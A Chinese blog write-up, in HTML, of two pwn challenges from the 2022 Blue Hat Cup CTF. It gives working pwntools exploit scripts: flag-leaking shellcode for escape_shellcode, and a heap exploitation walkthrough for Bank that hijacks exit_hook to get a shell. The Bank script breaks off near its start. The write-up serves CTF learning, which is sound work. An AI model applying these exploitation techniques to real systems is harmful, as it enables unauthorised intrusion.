@@ -1,0 +1,340 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="pwn还挺有意思的，第一题写shellcode，第二题能逆就能pwn    2022蓝帽杯初赛 pwn wp蓝帽杯2022 pwn escape_shellcode写shellcode题只允许使用read和write，但是程序在开始的时候将flag读取到了bss段上并且在调用shellcode之前还将寄存器的值都给清理掉了。因为程序开了pie所以直接使用flag地址行不通。那就需要思考一下如何泄">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022蓝帽杯初赛 pwn wp">
+<meta property="og:url" content="http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/index.html">
+<meta property="og:site_name" content="z1r0's blog">
+<meta property="og:description" content="pwn还挺有意思的，第一题写shellcode，第二题能逆就能pwn    2022蓝帽杯初赛 pwn wp蓝帽杯2022 pwn escape_shellcode写shellcode题只允许使用read和write，但是程序在开始的时候将flag读取到了bss段上并且在调用shellcode之前还将寄存器的值都给清理掉了。因为程序开了pie所以直接使用flag地址行不通。那就需要思考一下如何泄">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/186222b5bffe47fbae606372011f0510.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c11ffe376af34d74945b5c074a2261e6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/cf6a7e414196412493b79f439e7e903d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a189109eb4d247fe8d079111d6599893.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/58ed4b684e5d4681930c7ecb3b1ee369.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b196090bb0304c79a510f7c7a0132fd5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/59ddd9444fb541d6b6b888f18f1daa60.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f5edeed4bdda400ea661c74bd86daa3f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fd35e5977b77455b8d937cb563c8ded6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fc1a1ded543e4b4981e8426d3fa72e8a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/17e63464fe994b11b1f6606bb0800eaf.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5d4dfbf8ef9441cf8542a4ba43cd87a3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/70678072331141a5a6763b7d32b2f0fd.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/538159cb5202414ebd5d94b37d14e7b1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9a2b8ebaba8a40fcb989d4916107786a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c084ef31000146ff81921d5907493b45.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1e54df94c9b44cb9b28a50b42c3de488.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/799de37fe97c45649ebea7d26c306ffb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/08f3b59608764c98a3d04c6027f5f8b5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5603b2ee52744287986b21122a16c532.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/99b1d032a80c4e94b222fbad0255cece.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/840239fd755a483db2112b8a13eebc6a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/33003f628677432bb1571446150f8dbe.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e44219cfbd274b078921b3c98f0cea6f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/dff964a6bb554a5ab6758f2cec0ffd84.png">
+<meta property="article:published_time" content="2022-07-12T14:18:50.000Z">
+<meta property="article:modified_time" content="2022-07-12T14:25:29.704Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/186222b5bffe47fbae606372011f0510.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2022蓝帽杯初赛 pwn wp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/07/02/ciscn-2022-%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn-wp/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;text=2022蓝帽杯初赛 pwn wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;title=2022蓝帽杯初赛 pwn wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;is_video=false&amp;description=2022蓝帽杯初赛 pwn wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2022蓝帽杯初赛 pwn wp&amp;body=Check out this article: http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;title=2022蓝帽杯初赛 pwn wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;title=2022蓝帽杯初赛 pwn wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;title=2022蓝帽杯初赛 pwn wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;title=2022蓝帽杯初赛 pwn wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;name=2022蓝帽杯初赛 pwn wp&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp/&amp;t=2022蓝帽杯初赛 pwn wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-pwn-wp"><span class="toc-number">1.</span> <span class="toc-text">2022蓝帽杯初赛 pwn wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF2022-pwn-escape-shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">蓝帽杯2022 pwn escape_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF2022-pwn-Bank"><span class="toc-number">1.2.</span> <span class="toc-text">蓝帽杯2022 pwn Bank</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2022蓝帽杯初赛 pwn wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-07-12T14:18:50.000Z" itemprop="datePublished">2022-07-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WP/">WP</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>pwn还挺有意思的，第一题写shellcode，第二题能逆就能pwn</p>
+</blockquote>
+<font size="3">
+
+<h1 id="2022蓝帽杯初赛-pwn-wp"><a href="#2022蓝帽杯初赛-pwn-wp" class="headerlink" title="2022蓝帽杯初赛 pwn wp"></a>2022蓝帽杯初赛 pwn wp</h1><h2 id="蓝帽杯2022-pwn-escape-shellcode"><a href="#蓝帽杯2022-pwn-escape-shellcode" class="headerlink" title="蓝帽杯2022 pwn escape_shellcode"></a>蓝帽杯2022 pwn escape_shellcode</h2><p>写shellcode题<br><img src="https://img-blog.csdnimg.cn/186222b5bffe47fbae606372011f0510.png" alt="在这里插入图片描述"><br>只允许使用read和write，但是程序在开始的时候将flag读取到了bss段上<br><img src="https://img-blog.csdnimg.cn/c11ffe376af34d74945b5c074a2261e6.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cf6a7e414196412493b79f439e7e903d.png" alt="在这里插入图片描述"><br>并且在调用shellcode之前还将寄存器的值都给清理掉了。<br>因为程序开了pie所以直接使用flag地址行不通。那就需要思考一下如何泄露出flag地址。<br>这里可以借助fs寄存器来得到有关text段的地址，再算出flag地址即可。<br>fs寄存器用于保存线程局部存储TLS，TLS主要是为了避免多个线程访问同一全局变量或静态变量所导致的冲突。所以fs寄存器周围会有线程地址。在笔者调试的时候发现在0x300这里有一个栈地址，跟进发现里面放着有关text段的地址<br><img src="https://img-blog.csdnimg.cn/a189109eb4d247fe8d079111d6599893.png" alt="在这里插入图片描述"><br>算出flag偏移<br><img src="https://img-blog.csdnimg.cn/58ed4b684e5d4681930c7ecb3b1ee369.png" alt="在这里插入图片描述"><br>拿到flag地址之后直接write打印出来即可。exp如下</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./escape_shellcode'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'39.107.108.120'</span>, <span class="number">41912</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x555555558120</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">mov rsi, fs:[0x300]</span></span><br><span class="line"><span class="string">mov rsi, [rsi]</span></span><br><span class="line"><span class="string">add rsi, 0x2b90</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rdx, 0x50</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">r.send(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<p>解法肯定不止上面这一种，还有一种解法可以利用write遇到不写读的内存时会返回值小于0这个特性来解，我们可以先将rsi放到基址前面也就是根本没有这块内存的地方也就是小于下图的0x555555554000<br><img src="https://img-blog.csdnimg.cn/b196090bb0304c79a510f7c7a0132fd5.png" alt="在这里插入图片描述"><br>然后利用条件判断，每次rsi加上0x500，一直这样直到可以正常读的地址也就是0x555555554000后面。此时就应该在0x555555554000 - 0x555555554500附近，而flag在0x555555558120，我们只需要再让rsi为0x4000这样我们就可以拿到flag了，exp如下</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./escape_shellcode'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'39.107.108.120'</span>, <span class="number">41912</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">lea rsi, [rip]</span></span><br><span class="line"><span class="string">sub rsi, 0x5000000</span></span><br><span class="line"><span class="string">exp:</span></span><br><span class="line"><span class="string">  xor rdi, rdi</span></span><br><span class="line"><span class="string">  mov rdi, 1</span></span><br><span class="line"><span class="string">  xor rdx, rdx</span></span><br><span class="line"><span class="string">  mov rdx, 0x500</span></span><br><span class="line"><span class="string">  xor rax, rax</span></span><br><span class="line"><span class="string">  mov rax, 1</span></span><br><span class="line"><span class="string">  syscall</span></span><br><span class="line"><span class="string">  add rsi, 0x500</span></span><br><span class="line"><span class="string">cmp rax, 0</span></span><br><span class="line"><span class="string">jng exp</span></span><br><span class="line"><span class="string">mov rdx, 0x4000</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="蓝帽杯2022-pwn-Bank"><a href="#蓝帽杯2022-pwn-Bank" class="headerlink" title="蓝帽杯2022 pwn Bank"></a>蓝帽杯2022 pwn Bank</h2><p><img src="https://img-blog.csdnimg.cn/59ddd9444fb541d6b6b888f18f1daa60.png" alt="在这里插入图片描述"><br>保护全开<br>这道题其实逆清楚了基本就可以解出来了<br><img src="https://img-blog.csdnimg.cn/f5edeed4bdda400ea661c74bd86daa3f.png" alt="在这里插入图片描述"><br>这里是输入对应的单词就可以进入对应的功能<br>先看一下Deposit功能<br><img src="https://img-blog.csdnimg.cn/fd35e5977b77455b8d937cb563c8ded6.png" alt="在这里插入图片描述"><br>先判断是否login，接着输入多少钱，然后判断一下card_money钱是否足够，如何足够则总钱+输入的，这个函数没什么用。<br>看一下put函数<br><img src="https://img-blog.csdnimg.cn/fc1a1ded543e4b4981e8426d3fa72e8a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/17e63464fe994b11b1f6606bb0800eaf.png" alt="在这里插入图片描述"><br>这里就是需要存放的钱，判断是否小于总钱。并将需要存放的钱放入card_money中<br>接下来再看login函数<br><img src="https://img-blog.csdnimg.cn/5d4dfbf8ef9441cf8542a4ba43cd87a3.png" alt="在这里插入图片描述"><br>输入card_numbers，需要过检测<br><img src="https://img-blog.csdnimg.cn/70678072331141a5a6763b7d32b2f0fd.png" alt="在这里插入图片描述"><br>长度大于0，并在0-9之间，接下来输入密码的时候长度需要大于5，也是0-9<br><img src="https://img-blog.csdnimg.cn/538159cb5202414ebd5d94b37d14e7b1.png" alt="在这里插入图片描述"><br>满足上面的条件即可login成功<br><img src="https://img-blog.csdnimg.cn/9a2b8ebaba8a40fcb989d4916107786a.png" alt="在这里插入图片描述"><br>info函数就是打印这两个东西<br>Transfer这个功能很重要<br><img src="https://img-blog.csdnimg.cn/c084ef31000146ff81921d5907493b45.png" alt="在这里插入图片描述"><br>首先还是输入什么单词进入什么功能。<br>先是admin功能<br><img src="https://img-blog.csdnimg.cn/1e54df94c9b44cb9b28a50b42c3de488.png" alt="在这里插入图片描述"><br>这里可以进行越界读因为没有限制a1，但是a1必须大于30<br><img src="https://img-blog.csdnimg.cn/799de37fe97c45649ebea7d26c306ffb.png" alt="在这里插入图片描述"><br>hacker这个函数就是任意地址释放<br><img src="https://img-blog.csdnimg.cn/08f3b59608764c98a3d04c6027f5f8b5.png" alt="在这里插入图片描述"><br>guest申请了0x18大小的堆，并可以写入0x10个数据<br><img src="https://img-blog.csdnimg.cn/5603b2ee52744287986b21122a16c532.png" alt="在这里插入图片描述"><br>ghost这里可以申请小于0x100大小的堆，需要特别注意的是这里使用的是realloc函数<br><img src="https://img-blog.csdnimg.cn/99b1d032a80c4e94b222fbad0255cece.png" alt="在这里插入图片描述"><br>而abyss这个功能可以一次任意写并exit退出<br>所以我们可以劫持exit_hook来getshell。首先需要泄露出heap地址。这个很好办，前面利用了realloc这个函数，所以我们可以借助realloc来free出堆地址。<br><img src="https://img-blog.csdnimg.cn/840239fd755a483db2112b8a13eebc6a.png" alt="在这里插入图片描述"><br>上图红色的是借助realloc来free出堆地址，而粉色的是vuln_addr，admin这个功能可以从vuln这里往后读到最后一个红框的堆地址。<br>0x421这个是为了泄露出libc地址做准备。<br><img src="https://img-blog.csdnimg.cn/33003f628677432bb1571446150f8dbe.png" alt="在这里插入图片描述"><br>继续利用realloc往后走，将距离0x420后的prev改成0x420这样利用hacker来free 0x55555575a2c0这个地址时候可以绕过检查<br><img src="https://img-blog.csdnimg.cn/e44219cfbd274b078921b3c98f0cea6f.png" alt="在这里插入图片描述"><br>到了这一步直接admin来泄露的话还不行因为i还小于30，所以想个办法将下面的堆合并一下使得i大于30可以利用admin泄露出来。<br><img src="https://img-blog.csdnimg.cn/dff964a6bb554a5ab6758f2cec0ffd84.png" alt="在这里插入图片描述"><br>泄露出libc之后再次利用hacker将vuln_addr地址释放掉，这样再利用guest的时候可以将vuln_addr给劫持到exit_hook这里。接着利用abyss将exit_hook改成one_gadget即可getshell</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./Bank'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process([file_name], env={<span class="string">"LD_PRELOAD"</span>:<span class="string">'./2.31/lib/x86_64-linux-gnu/libc-2.31.so'</span>})</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Click: '</span></span><br><span class="line"><span 